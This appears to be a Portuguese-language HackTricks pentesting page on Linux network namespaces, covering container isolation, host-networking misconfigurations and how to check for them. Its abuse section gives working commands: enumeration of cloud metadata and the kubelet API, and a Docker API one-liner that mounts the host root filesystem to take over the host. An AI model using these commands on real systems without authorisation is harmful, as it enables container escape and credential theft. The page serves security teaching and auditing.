# Network Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Visão Geral

O network namespace isola recursos relacionados à rede, como interfaces, endereços IP, tabelas de roteamento, estado ARP/neighbor, regras de firewall, sockets e o conteúdo de arquivos como `/proc/net`. É por isso que um container pode ter o que parece ser seu próprio `eth0`, suas próprias rotas locais e seu próprio dispositivo loopback sem possuir a pilha de rede real do host.

Do ponto de vista de segurança, isso importa porque o isolamento de rede é muito mais do que port binding. Um network namespace privado limita o que o workload pode observar ou reconfigurar diretamente. Uma vez que esse namespace é compartilhado com o host, o container pode, de repente, ganhar visibilidade sobre host listeners, serviços locais do host e pontos de controle de rede que nunca deveriam ser expostos à aplicação.

## Operação

Um network namespace recém-criado começa com um ambiente de rede vazio ou quase vazio até que interfaces sejam anexadas a ele. Os container runtimes então criam ou conectam interfaces virtuais, atribuem endereços e configuram rotas para que o workload tenha a conectividade esperada. Em implantações baseadas em bridge, isso geralmente significa que o container vê uma interface veth conectada a uma bridge do host. Em Kubernetes, plugins CNI cuidam da configuração equivalente para a rede de Pods.

Essa arquitetura explica por que `--network=host` ou `hostNetwork: true` representam uma mudança tão drástica. Em vez de receber uma pilha de rede privada preparada, o workload passa a usar a pilha real do host.

## Laboratório

Você pode ver um network namespace quase vazio com:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
E você pode comparar containers normais e host-networked com:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
O contêiner com host networking não tem mais sua própria visão isolada de sockets e interfaces. Essa mudança por si só já é significativa antes mesmo de você perguntar quais capabilities o processo possui.

## Uso em tempo de execução

Docker e Podman normalmente criam um network namespace privado para cada container, a menos que configurados de outra forma. Kubernetes normalmente dá a cada Pod seu próprio network namespace, compartilhado pelos containers dentro desse Pod mas separado do host. Incus/LXC systems também oferecem isolamento rico baseado em network-namespace, frequentemente com uma maior variedade de configurações de rede virtual.

O princípio comum é que networking privado é a fronteira de isolamento padrão, enquanto host networking é uma saída explícita dessa fronteira.

## Configurações incorretas

A misconfiguração mais importante é simplesmente compartilhar o host network namespace. Isso às vezes é feito por desempenho, monitoramento de baixo nível ou conveniência, mas remove uma das fronteiras mais limpas disponíveis para containers. Host-local listeners tornam-se acessíveis de forma mais direta, serviços apenas em localhost podem ficar acessíveis, e capabilities como `CAP_NET_ADMIN` ou `CAP_NET_RAW` tornam-se muito mais perigosas porque as operações que elas habilitam agora são aplicadas ao próprio ambiente de rede do host.

Outro problema é conceder em excesso capabilities relacionadas à rede mesmo quando o network namespace é privado. Um namespace privado ajuda, mas não torna raw sockets ou controle avançado de rede inofensivos.

## Abuso

Em setups com isolamento fraco, atacantes podem inspecionar serviços ouvintes do host, alcançar endpoints de gerenciamento vinculados apenas ao loopback, sniffar ou interferir com o tráfego dependendo das capabilities e do ambiente exatos, ou reconfigurar rotas e estado de firewall se `CAP_NET_ADMIN` estiver presente. Em um cluster, isso também pode facilitar movimento lateral e reconhecimento do control-plane.

Se você suspeitar de host networking, comece confirmando que as interfaces visíveis e os listeners pertencem ao host em vez de a uma rede de container isolada:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Serviços apenas acessíveis via loopback costumam ser a primeira descoberta interessante:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Se as capacidades de rede estiverem presentes, teste se o workload pode inspecionar ou alterar a stack visível:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Em ambientes de cluster ou cloud, host networking também justifica uma recon local rápida de metadata e de control-plane-adjacent services:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Exemplo completo: Host networking + Runtime local / Acesso ao Kubelet

A rede do host não fornece automaticamente root do host, mas frequentemente expõe serviços que são intencionalmente acessíveis apenas a partir do próprio nó. Se um desses serviços estiver fracamente protegido, a rede do host torna-se um caminho direto de privilege-escalation.

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet em localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Impacto:

- comprometimento direto do host se uma API de runtime local estiver exposta sem proteção adequada
- reconhecimento do cluster ou movimentação lateral se kubelet ou agentes locais estiverem acessíveis
- manipulação de tráfego ou negação de serviço quando combinado com `CAP_NET_ADMIN`

## Verificações

O objetivo dessas verificações é determinar se o processo possui uma pilha de rede privada, quais rotas e listeners estão visíveis e se a visão de rede já se assemelha à do host antes mesmo de você testar capabilities.
```bash
readlink /proc/self/ns/net   # Network namespace identifier
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
O que é interessante aqui:

- Se o identificador do namespace ou o conjunto de interfaces visíveis parecer com os do host, host networking pode já estar em uso.
- `ss -lntup` é especialmente valioso porque revela ouvintes apenas em loopback e endpoints locais de gerenciamento.
- Rotas, nomes de interface e o contexto do firewall tornam-se muito mais importantes se `CAP_NET_ADMIN` ou `CAP_NET_RAW` estiverem presentes.

Ao revisar um container, sempre avalie o network namespace juntamente com o conjunto de capabilities. Host networking combinado com capacidades de rede fortes é uma postura muito diferente de bridge networking combinado com um conjunto de capabilities padrão mais restrito.
{{#include ../../../../../banners/hacktricks-training.md}}
